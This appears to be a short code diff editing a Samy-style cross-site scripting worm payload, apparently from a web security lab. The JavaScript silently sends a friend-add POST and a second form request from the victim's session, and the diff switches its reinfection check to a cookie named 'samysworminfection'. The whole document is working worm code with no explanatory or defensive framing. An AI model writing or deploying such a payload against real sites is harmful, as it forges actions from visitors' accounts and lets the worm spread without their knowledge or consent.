@@ -1,4 +1,4 @@
-if(document.getElementById("the_script_has_been_run") == null){
+if(document.cookie.indexOf('samysworminfection') == -1){
   a=new XMLHttpRequest();
   a.open('POST','/add_friend.php?id=18',true);
   a.send();
@@ -8,6 +8,7 @@ if(document.getElementById("the_script_has_been_run") == null){
   c.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
   c.send();
   console.log("success");
+  document.cookie = "samysworminfection=1";
 } else {
    
 }
